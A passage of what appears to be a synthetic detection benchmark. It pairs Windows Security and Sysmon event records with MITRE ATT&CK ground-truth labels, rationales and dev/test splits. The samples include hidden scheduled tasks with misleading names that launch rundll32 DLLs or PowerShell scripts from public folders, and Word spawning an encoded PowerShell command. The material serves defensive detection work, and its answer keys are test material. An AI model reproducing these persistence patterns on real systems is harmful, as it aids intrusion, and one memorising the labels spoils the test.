      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{6daac46a-331b-f50b-3963-92de323bffbe}",
      "ParentProcessId": 64868,
      "ProcessGuid": "{1497b86c-c7d8-27d6-2061-eebfef83ed3b}",
      "ProcessId": 64876,
      "User": "jsmith",
      "UtcTime": "2026-05-03T00:41:57Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-03T00:41:57Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4698,
    "SubjectLogonId": "0xfd69",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefresh_oak_larch_ash_018e36",
    "TimeCreated": "2026-05-03T00:41:54Z"
  },
  {
    "CommandLine": "C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=a16c2ed87d161cf143e24df8b15be94fe2c835e470f810977c0e75aed2db8549",
    "Image": "C:\\ProgramData\\oak_larch_ash_018e36\\agent.exe",
    "LogonGuid": "{435316e7-03ae-9335-ca8e-e7ccc3a52e9b}",
    "LogonId": "0xfd69",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{6daac46a-331b-f50b-3963-92de323bffbe}",
    "ParentProcessId": 64868,
    "ProcessGuid": "{1497b86c-c7d8-27d6-2061-eebfef83ed3b}",
    "ProcessId": 64876,
    "User": "jsmith",
    "UtcTime": "2026-05-03T00:41:57Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_B/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_358cd0a2",
        "fields": [
          "Computer",
          "TaskContent",
          "TaskName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_4d732c35",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The later process-creation record matches the executable and arguments configured in the task. This is consistent with payload invocation, but these records alone do not establish that Task Scheduler launched it or that the payload completed.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_413f4f0d"
}
```

## pair_314066ea
Family: TF_T1053_005_D; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_8f7645aa",
    "event_record_id": 76973180437191,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0x10435",
      "SubjectUserName": "admin.svc",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry</Arguments></Exec></Actions></Task>",
      "TaskName": "\\OneDriveUpdate_oak_spruce_beech_314066",
      "TimeCreated": "2026-01-04T18:59:34Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-04T18:59:34Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0x10435",
    "SubjectUserName": "admin.svc",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry</Arguments></Exec></Actions></Task>",
    "TaskName": "\\OneDriveUpdate_oak_spruce_beech_314066",
    "TimeCreated": "2026-01-04T18:59:34Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_D/single",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_8f7645aa",
        "fields": [
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The scheduled-task record exposes a misleading name, hidden trigger, and a configured DLL target under Public.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_6977a566"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_8f7645aa",
    "event_record_id": 76973180437191,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0x10435",
      "SubjectUserName": "admin.svc",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry</Arguments></Exec></Actions></Task>",
      "TaskName": "\\OneDriveUpdate_oak_spruce_beech_314066",
      "TimeCreated": "2026-01-04T18:59:34Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-04T18:59:34Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_c0128db0",
    "event_record_id": 26898101313451,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=e3813318ac214fcb88fde4faef6871e2aa47a7dc57b405d975799cd4aabce81b",
      "Image": "C:\\Windows\\System32\\rundll32.exe",
      "LogonGuid": "{84e83df2-bac3-b31a-bb49-664a998ccf1d}",
      "LogonId": "0x10435",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{1888ed03-1f78-b67c-cbdc-917267562818}",
      "ParentProcessId": 66608,
      "ProcessGuid": "{1876b3c6-1fab-8607-0cdd-1a48172215b8}",
      "ProcessId": 66616,
      "User": "admin.svc",
      "UtcTime": "2026-01-04T18:59:37Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-04T18:59:37Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0x10435",
    "SubjectUserName": "admin.svc",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry</Arguments></Exec></Actions></Task>",
    "TaskName": "\\OneDriveUpdate_oak_spruce_beech_314066",
    "TimeCreated": "2026-01-04T18:59:34Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\oak_spruce_beech_314066\\cache.dll,Entry",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=e3813318ac214fcb88fde4faef6871e2aa47a7dc57b405d975799cd4aabce81b",
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "LogonGuid": "{84e83df2-bac3-b31a-bb49-664a998ccf1d}",
    "LogonId": "0x10435",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{1888ed03-1f78-b67c-cbdc-917267562818}",
    "ParentProcessId": 66608,
    "ProcessGuid": "{1876b3c6-1fab-8607-0cdd-1a48172215b8}",
    "ProcessId": 66616,
    "User": "admin.svc",
    "UtcTime": "2026-01-04T18:59:37Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_D/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_8f7645aa",
        "fields": [
          "Computer",
          "TaskContent",
          "TaskName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_c0128db0",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process-creation record shows rundll32 invoked with the DLL path configured in the task; it does not establish that DLL loading succeeded or that the task triggered the process.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_3ee411cc"
}
```

## pair_1de82d97
Family: TF_T1053_005_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_c8bb3051",
    "event_record_id": 9839797458121,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4698,
      "SubjectLogonId": "0x7281",
      "SubjectUserName": "agarcia",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry</Arguments></Exec></Actions></Task>",
      "TaskName": "\\SessionTelemetry_maple_aspen_alder_1de82d",
      "TimeCreated": "2026-04-28T13:59:34Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-28T13:59:34Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4698,
    "SubjectLogonId": "0x7281",
    "SubjectUserName": "agarcia",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry</Arguments></Exec></Actions></Task>",
    "TaskName": "\\SessionTelemetry_maple_aspen_alder_1de82d",
    "TimeCreated": "2026-04-28T13:59:34Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_DEV/single",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_c8bb3051",
        "fields": [
          "TaskContent"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The task event records a hidden action configured to invoke rundll32 on a DLL entry point; this is configuration evidence.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_3b2eb0fc"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_c8bb3051",
    "event_record_id": 9839797458121,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4698,
      "SubjectLogonId": "0x7281",
      "SubjectUserName": "agarcia",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry</Arguments></Exec></Actions></Task>",
      "TaskName": "\\SessionTelemetry_maple_aspen_alder_1de82d",
      "TimeCreated": "2026-04-28T13:59:34Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-28T13:59:34Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_93436530",
    "event_record_id": 185924445121892,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=e3813318ac214fcb88fde4faef6871e2aa47a7dc57b405d975799cd4aabce81b",
      "Image": "C:\\Windows\\System32\\rundll32.exe",
      "LogonGuid": "{5417d24b-0801-301f-2954-8937b9b0b23b}",
      "LogonId": "0x7281",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{2cb3d07a-b418-38b3-bd1d-f268cf75adce}",
      "ParentProcessId": 29308,
      "ProcessGuid": "{a918e881-ad64-9ea9-c8f9-6096d82d1196}",
      "ProcessId": 29316,
      "User": "agarcia",
      "UtcTime": "2026-04-28T13:59:37Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-28T13:59:37Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4698,
    "SubjectLogonId": "0x7281",
    "SubjectUserName": "agarcia",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\rundll32.exe</Command><Arguments>C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry</Arguments></Exec></Actions></Task>",
    "TaskName": "\\SessionTelemetry_maple_aspen_alder_1de82d",
    "TimeCreated": "2026-04-28T13:59:34Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\maple_aspen_alder_1de82d\\session.dll,Entry",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=e3813318ac214fcb88fde4faef6871e2aa47a7dc57b405d975799cd4aabce81b",
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "LogonGuid": "{5417d24b-0801-301f-2954-8937b9b0b23b}",
    "LogonId": "0x7281",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{2cb3d07a-b418-38b3-bd1d-f268cf75adce}",
    "ParentProcessId": 29308,
    "ProcessGuid": "{a918e881-ad64-9ea9-c8f9-6096d82d1196}",
    "ProcessId": 29316,
    "User": "agarcia",
    "UtcTime": "2026-04-28T13:59:37Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_DEV/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_c8bb3051",
        "fields": [
          "Computer",
          "TaskContent"
        ]
      },
      {
        "event_id": "evt_93436530",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "A process-creation record shows rundll32 invoked with the DLL configured in the task; it does not establish task causality or successful DLL loading.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_e8c80866"
}
```

## pair_343944e6
Family: TF_T1053_005_E; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_60f1fdb4",
    "event_record_id": 163518828466792,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0xe539",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"</Arguments></Exec></Actions></Task>",
      "TaskName": "\\ScriptRefresh_spruce_willow_maple_343944",
      "TimeCreated": "2026-05-11T23:35:33Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-11T23:35:33Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0xe539",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"</Arguments></Exec></Actions></Task>",
    "TaskName": "\\ScriptRefresh_spruce_willow_maple_343944",
    "TimeCreated": "2026-05-11T23:35:33Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_60f1fdb4",
        "fields": [
          "TaskContent"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "PowerShell in a task is observable, but the single view does not establish whether the task is authorized or adversarial.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_f0193faf"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_60f1fdb4",
    "event_record_id": 163518828466792,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0xe539",
      "SubjectUserName": "jsmith",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"</Arguments></Exec></Actions></Task>",
      "TaskName": "\\ScriptRefresh_spruce_willow_maple_343944",
      "TimeCreated": "2026-05-11T23:35:33Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-11T23:35:33Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_8a3de13d",
    "event_record_id": 10475980792683,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{8c19e7b3-3759-76a4-0581-ca755cce4d74}",
      "LogonId": "0xe539",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{bee96957-0af8-3a23-9dab-c1814cd7eb3f}",
      "ParentProcessId": 58676,
      "ProcessGuid": "{0987211d-236b-24fb-e0dc-57bb6446e010}",
      "ProcessId": 58684,
      "User": "jsmith",
      "UtcTime": "2026-05-11T23:35:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-11T23:35:36Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_64902cf8",
    "event_record_id": 274201244016778,
    "fields": {
      "Computer": "FILESVR01",
      "DestinationIp": "203.0.113.50",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{0987211d-236b-24fb-e0dc-57bb6446e010}",
      "ProcessId": 58684,
      "Protocol": "tcp",
      "SourceIp": "203.0.113.10",
      "SourcePort": 61278,
      "User": "jsmith",
      "UtcTime": "2026-05-11T23:35:39Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-11T23:35:39Z",
    "windows_event_id": 3
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0xe539",
    "SubjectUserName": "jsmith",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"</Arguments></Exec></Actions></Task>",
    "TaskName": "\\ScriptRefresh_spruce_willow_maple_343944",
    "TimeCreated": "2026-05-11T23:35:33Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File \"C:\\Users\\Public\\spruce_willow_maple_343944\\run.ps1\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{8c19e7b3-3759-76a4-0581-ca755cce4d74}",
    "LogonId": "0xe539",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{bee96957-0af8-3a23-9dab-c1814cd7eb3f}",
    "ParentProcessId": 58676,
    "ProcessGuid": "{0987211d-236b-24fb-e0dc-57bb6446e010}",
    "ProcessId": 58684,
    "User": "jsmith",
    "UtcTime": "2026-05-11T23:35:36Z"
  },
  {
    "Computer": "FILESVR01",
    "DestinationIp": "203.0.113.50",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{0987211d-236b-24fb-e0dc-57bb6446e010}",
    "ProcessId": 58684,
    "Protocol": "tcp",
    "SourceIp": "203.0.113.10",
    "SourcePort": 61278,
    "User": "jsmith",
    "UtcTime": "2026-05-11T23:35:39Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1053_005_E/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_60f1fdb4",
        "fields": [
          "Computer",
          "TaskContent",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_8a3de13d",
        "fields": [
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_64902cf8",
        "fields": [
          "Computer",
          "DestinationPort",
          "ProcessGuid",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The task configuration matches a later PowerShell process-creation record and related outbound activity. These records support a task-payload invocation but do not prove the task caused the process start or that execution completed.",
  "technique_ids": [
    "T1053.005"
  ],
  "technique_names": [
    "Scheduled Task"
  ],
  "view_id": "view_4c3760e4"
}
```

## pair_00929d32
Family: TF_T1059_001_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_f2301436",
    "event_record_id": 163183717332477,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAbABkAGUAcgBfAGEAcwBwAGUAbgBfADAAMAA5ADIAOQBkACcA",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
      "LogonId": "0xd045",
      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "ParentProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
      "ParentProcessId": 53320,
      "ProcessGuid": "{946a2b81-35fd-1399-e072-b1b9ef9b7525}",
      "ProcessId": 53316,
      "User": "jsmith",
      "UtcTime": "2026-06-01T19:26:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T19:26:02Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAbABkAGUAcgBfAGEAcwBwAGUAbgBfADAAMAA5ADIAOQBkACcA",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
    "LogonId": "0xd045",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
    "ParentProcessId": 53320,
    "ProcessGuid": "{946a2b81-35fd-1399-e072-b1b9ef9b7525}",
    "ProcessId": 53316,
    "User": "jsmith",
    "UtcTime": "2026-06-01T19:26:02Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_A/single",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_f2301436",
        "fields": [
          "CommandLine",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The Sysmon process-creation record shows PowerShell with an encoded command line and an Office parent.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_098f83e9"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_53c599a7",
    "event_record_id": 247946691833036,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=bc87f5aece4b3b2a5c86e61f8fb7a8d07b31d5e03f34f2cf1ecbf0afd4b3f282",
      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
      "LogonId": "0xd045",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{065a807e-a1e9-5145-2496-eb7fb8f3a90d}",
      "ParentProcessId": 53312,
      "ProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
      "ProcessId": 53320,
      "User": "jsmith",
      "UtcTime": "2026-06-01T19:25:59Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T19:25:59Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
